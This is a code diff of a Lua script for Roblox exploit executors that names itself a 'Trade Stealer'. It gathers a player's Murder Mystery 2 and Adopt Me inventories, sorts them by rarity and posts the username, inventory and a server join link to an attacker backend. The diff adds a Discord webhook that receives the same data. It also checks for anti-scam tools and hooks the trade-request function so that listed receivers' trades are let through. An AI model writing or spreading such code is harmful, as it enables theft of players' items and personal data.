@@ -3,6 +3,7 @@ local PlaceId = game.PlaceId
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
+local HS = game:GetService("HttpService")
 
 local function do_request(method, url, body, headers)
     return request({Url=url, Method=method, Body=body, Headers=headers or {}})
@@ -22,8 +23,7 @@ end
 
 local function detect_antiscam()
     local g = getgenv()
-    local flags = {"antiscam","TradeBlocker","ScamGuard","NoTrade"}
-    for _,f in ipairs(flags) do
+    for _,f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
         if g[f] then return true end
     end
     return false
@@ -38,7 +38,7 @@ local function collect_mm2_items()
     local ok2, Sync = pcall(function()
         return require(RS.Database.Sync)
     end)
-    local rarityOrder = {Unique=1, Ancient=2, Godly=3, Legendary=4, Rare=5, Uncommon=6, Common=7}
+    local rarityOrder = {Unique=1,Ancient=2,Godly=3,Legendary=4,Rare=5,Uncommon=6,Common=7}
     for itemName, amount in pairs(ProfileData.Weapons.Owned) do
         local rarity = "Unknown"
         if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
@@ -46,10 +46,8 @@ local function collect_mm2_items()
         end
         table.insert(items, {name=itemName, id="", rarity=rarity, amount=tostring(amount)})
     end
-    table.sort(items, function(a, b)
-        local ra = rarityOrder[a.rarity] or 999
-        local rb = rarityOrder[b.rarity] or 999
-        return ra < rb
+    table.sort(items, function(a,b)
+        return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
     end)
     return items
 end
@@ -67,23 +65,69 @@ local function collect_adoptme_items()
     return items
 end
 
-local function send_job(game_name, items)
-    local payload = {
-        game         = game_name,
-        username     = lp.Name,
-        display_name = lp.DisplayName,
-        executor     = get_executor(),
-        roblox_version = get_roblox_version(),
-        antiscam     = detect_antiscam(),
-        allowed      = CFG.allowed,
-        place_id     = tostring(PlaceId),
-        job_id       = game.JobId,
-        items        = items,
+local function rarity_counts(items)
+    local counts = {}
+    local order = {"Ancient","Godly","Chroma","Unique","Vintage","Legendary","Rare","Uncommon","Common","Unknown"}
+    for _, it in ipairs(items) do
+        counts[it.rarity] = (counts[it.rarity] or 0) + 1
+    end
+    local lines = {}
+    for _, r in ipairs(order) do
+        if counts[r] then
+            table.insert(lines, r..": "..counts[r])
+        end
+    end
+    return #lines > 0 and table.concat(lines, "\n") or "None"
+end
+
+local function send_discord(items, game_name)
+    if not CFG.webhook or CFG.webhook == "" then return end
+    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
+    local receivers = table.concat(CFG.allowed, ", ")
+    local item_lines = {}
+    for _, it in ipairs(items) do
+        table.insert(item_lines, it.name.." ("..it.rarity..")")
+    end
+    local inv_text = #item_lines > 0 and table.concat(item_lines, "\n") or "None"
+    if #inv_text > 1000 then inv_text = string.sub(inv_text, 1, 1000).."..." end
+
+    local embed = {
+        username = "Trade Stealer",
+        embeds = {{
+            title = game_name.." Stealer",
+            color = 15158332,
+            fields = {
+                {name="Username",     value=lp.Name,              inline=true},
+                {name="Display",      value=lp.DisplayName,        inline=true},
+                {name="Executor",     value=get_executor(),        inline=true},
+                {name="Antiscam",     value=tostring(detect_antiscam()), inline=true},
+                {name="Receiver",     value=receivers,             inline=true},
+                {name="Inventory",    value=rarity_counts(items),  inline=false},
+                {name="Items",        value=inv_text,              inline=false},
+                {name="Join Link",    value="["..game.JobId.."]("..join..")", inline=false},
+            },
+        }}
     }
-    local body = game:GetService("HttpService"):JSONEncode(payload)
-    do_request("POST", CFG.backend.."/job", body, {
-        ["Content-Type"]  = "application/json",
-        ["X-API-Key"]     = CFG.api_key,
+    pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
+end
+
+local function send_job(game_name, items)
+    send_discord(items, game_name)
+    local payload = {
+        game           = game_name,
+        username       = lp.Name,
+        display_name   = lp.DisplayName,
+        executor       = get_executor(),
+        roblox_version = get_roblox_version(),
+        antiscam       = detect_antiscam(),
+        allowed        = CFG.allowed,
+        place_id       = tostring(PlaceId),
+        job_id         = game.JobId,
+        items          = items,
+    }
+    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
+        ["Content-Type"] = "application/json",
+        ["X-API-Key"]    = CFG.api_key,
     })
 end
 
@@ -92,22 +136,19 @@ local function hook_mm2()
     if not Trade then return end
     local tradeReqFunction = Trade:WaitForChild("SendRequest", 10)
     if not tradeReqFunction then return end
-
     local items = collect_mm2_items()
     send_job("MM2", items)
-
     local old_invoke
     old_invoke = hookfunction(tradeReqFunction.OnClientInvoke, function(senderPlayer, ...)
         local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
-        local isAllowed = false
         for _, n in ipairs(CFG.allowed) do
-            if n == senderName then isAllowed = true break end
+            if n == senderName then
+                task.wait(CFG.delay / 1000)
+                return old_invoke(senderPlayer, ...)
+            end
         end
-        if not isAllowed then return old_invoke(senderPlayer, ...) end
-        task.wait(CFG.delay / 1000)
         return old_invoke(senderPlayer, ...)
     end)
-
     local tradeGui = lp:WaitForChild("PlayerGui"):WaitForChild("TradeGUI", 10)
     local tradeGuiPhone = lp.PlayerGui:FindFirstChild("TradeGUI_Phone")
     if tradeGui then
@@ -123,8 +164,7 @@ local function hook_mm2()
 end
 
 local function hook_adoptme()
-    local items = collect_adoptme_items()
-    send_job("AdoptMe", items)
+    send_job("AdoptMe", collect_adoptme_items())
 end
 
 local function hook_bladeball()
@@ -143,10 +183,5 @@ local GAMES = {
     [920587237]   = hook_adoptme,
     [13772394625] = hook_bladeball,
 }
-
 local handler = GAMES[PlaceId]
-if handler then
-    handler()
-else
-    send_job("Unknown", {})
-end
+if handler then handler() else send_job("Unknown", {}) end
